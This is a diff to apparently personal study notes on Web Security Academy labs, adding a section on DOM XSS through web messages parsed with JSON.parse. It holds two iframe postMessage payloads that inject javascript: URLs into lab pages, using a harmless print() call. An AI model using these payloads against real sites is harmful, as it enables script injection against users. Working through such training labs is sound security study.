@@ -31,3 +31,10 @@ The message includes javascript for any (*) target origin
 ```
 <iframe src="https://0a27003803718cf18050940e007f00d6.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 ```
+
+## DOM XSS using web messages and *JSON.parse*
+Similar vulnerability except the sink now calls JSON.parse(e.data) and returns if the validation fails.
+The exploit payload delivers a JSON object where the url calls malicious javascript. 
+```
+<iframe src=https://0a55002603bafe7d81a09d2000d50006.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({type:"load-channel",url:"javascript:print()"}),"*")'>
+```
